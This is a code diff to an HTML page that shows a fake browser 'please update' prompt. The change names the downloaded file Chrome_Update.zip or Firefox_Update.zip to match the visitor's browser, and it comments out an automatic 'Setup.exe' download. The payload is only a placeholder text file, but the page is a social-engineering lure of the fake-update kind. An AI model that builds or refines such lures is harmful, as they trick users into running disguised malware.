@@ -318,7 +318,7 @@
             <p>
                 please update
             </p>
-            <a href="data:text/plain;charset=utf-8,.%2Fhi.txt" download='Setup.exe'>
+            <a id='download' href="data:text/plain;charset=utf-8,.%2Fhi.txt" download='Setup.exe'>
                 <button id='update-button' class='update-button'>
                     更新
                 </button>
@@ -360,6 +360,7 @@
             a = document.createElement('p')
             a.append(`Version: ${version}`)
             document.getElementById('content').appendChild(a)
+            document.getElementById('download').setAttribute('download', 'Chrome_Update.zip')
         } else if (navigator.userAgent.indexOf("Safari") != -1) {
             const version = navigator.userAgent.split('Version/')[1].split(' ')[0]
             let a = document.createElement('p')
@@ -376,6 +377,7 @@
             a = document.createElement('p')
             a.append(`Version: ${version}`)
             document.getElementById('content').appendChild(a)
+            document.getElementById('download').setAttribute('download', 'Firefox_Update.zip')
         } else {
             console.log('Unknown')
         }
@@ -392,7 +394,7 @@
 
             document.body.removeChild(element);
         }
-        download("Setup.exe", "./hi.txt");
+        // download("Setup.exe", "./hi.txt");
         console.log(navigator)
     </script>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
